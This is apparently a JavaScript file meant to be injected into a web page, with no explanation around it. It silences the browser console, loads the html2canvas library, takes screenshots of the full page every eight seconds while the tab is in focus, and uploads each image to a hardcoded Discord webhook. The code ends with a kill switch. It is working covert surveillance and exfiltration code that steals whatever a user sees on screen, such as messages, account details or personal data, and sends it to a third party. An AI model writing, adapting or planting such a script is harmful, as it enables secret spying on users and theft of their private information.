(function() {
    'use strict';

    if (window._t) {
        try { if (typeof window._t.kill === 'function') window._t.kill(); } catch(e) {}
        delete window._t;
    }

    var _webhook = 'https://discord.com/api/webhooks/1528640195078127749/35O0Xx21ArQS9hRR1gVQt685v2nxex7QChvdm9Kis59ecqpSUlnYopOdgA05179bAPDG';

    var _interval = null;
    var _running = false;
    var _visible = true;
    var _cfg = { interval: 8000, quality: 0.8, scale: 0.9 };

    var _noop = function() {};
    var _orig = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };
    console.log = _noop;
    console.warn = _noop;
    console.error = _noop;
    console.info = _noop;
    console.debug = _noop;

    function _loadLib() {
        return new Promise(function(resolve) {
            if (typeof html2canvas !== 'undefined') { resolve(); return; }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            s.onload = function() { resolve(); };
            s.onerror = function() { resolve(); };
            document.head.appendChild(s);
        });
    }

    function _toBlob(dataURL) {
        try {
            var parts = dataURL.split(',');
            var mime = parts[0].match(/:(.*?);/)[1];
            var bstr = atob(parts[1]);
            var n = bstr.length;
            var u8 = new Uint8Array(n);
            for (var i = 0; i < n; i++) {
                u8[i] = bstr.charCodeAt(i);
            }
            return new Blob([u8], { type: mime });
        } catch(e) {
            return null;
        }
    }

    function _send(dataURL) {
        var blob = _toBlob(dataURL);
        if (!blob) return Promise.resolve();
        var fd = new FormData();
        fd.append('file', blob, 'screenshot.jpg');
        return fetch(_webhook, { method: 'POST', body: fd }).catch(_noop);
    }

    function _captureHtml2Canvas() {
        return new Promise(function(resolve) {
            var canvas = document.querySelector('canvas');
            if (canvas) {
                try {
                    var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
                    if (dataURL && dataURL.length > 2000) {
                        _send(dataURL).then(resolve).catch(resolve);
                        return;
                    }
                } catch(e) {}
            }

            html2canvas(document.body, {
                scale: _cfg.scale,
                useCORS: true,
                logging: false,
                backgroundColor: null,
                allowTaint: true,
                width: window.innerWidth,
                height: Math.max(document.documentElement.scrollHeight, window.innerHeight),
                ignoreElements: function(el) {
                    return el.tagName === 'VIDEO';
                },
                onclone: function(clonedDoc) {
                    var canvases = clonedDoc.querySelectorAll('canvas');
                    for (var i = 0; i < canvases.length; i++) {
                        try {
                            var ctx = canvases[i].getContext('2d');
                            if (ctx) {
                                var imgData = ctx.getImageData(0, 0, canvases[i].width, canvases[i].height);
                                var isBlack = true;
                                for (var j = 0; j < imgData.data.length; j += 4) {
                                    if (imgData.data[j] > 10 || imgData.data[j+1] > 10 || imgData.data[j+2] > 10) {
                                        isBlack = false;
                                        break;
                                    }
                                }
                                if (isBlack && canvases[i].width > 10 && canvases[i].height > 10) {
                                    canvases[i].style.backgroundColor = '#1a1a2e';
                                    ctx.fillStyle = '#1a1a2e';
                                    ctx.fillRect(0, 0, canvases[i].width, canvases[i].height);
                                }
                            }
                        } catch(e) {}
                    }
                }
            }).then(function(canvas) {
                var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
                if (dataURL && dataURL.length > 5000) {
                    _send(dataURL).then(resolve).catch(resolve);
                } else {
                    resolve();
                }
            }).catch(function() {
                resolve();
            });
        });
    }

    function _capture() {
        if (_running || !_visible) return Promise.resolve();
        _running = true;

        return _loadLib()
            .then(function() {
                return _captureHtml2Canvas();
            })
            .then(function() { _running = false; })
            .catch(function() { _running = false; });
    }

    function _start() {
        if (_interval) return;
        _capture();
        _interval = setInterval(function() {
            if (_visible) _capture();
        }, _cfg.interval);
    }

    function _stop() {
        if (_interval) {
            clearInterval(_interval);
            _interval = null;
        }
    }

    function _kill() {
        _stop();
        document.removeEventListener('visibilitychange', _visibilityHandler);
        window.removeEventListener('blur', _blurHandler);
        window.removeEventListener('focus', _focusHandler);
        console.log = _orig.log;
        console.warn = _orig.warn;
        console.error = _orig.error;
        console.info = _orig.info;
        console.debug = _orig.debug;
        delete window._t;
    }

    function _visibilityHandler() {
        _visible = !document.hidden;
        if (_visible) _start(); else _stop();
    }

    function _blurHandler() {
        _visible = false;
        _stop();
    }

    function _focusHandler() {
        _visible = true;
        _start();
    }

    function _init() {
        document.addEventListener('visibilitychange', _visibilityHandler);
        window.addEventListener('blur', _blurHandler);
        window.addEventListener('focus', _focusHandler);
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            _start();
        } else {
            document.addEventListener('DOMContentLoaded', _start);
        }
    }

    window._t = {
        kill: _kill,
        start: _start,
        stop: _stop,
        capture: _capture
    };

    _init();

})();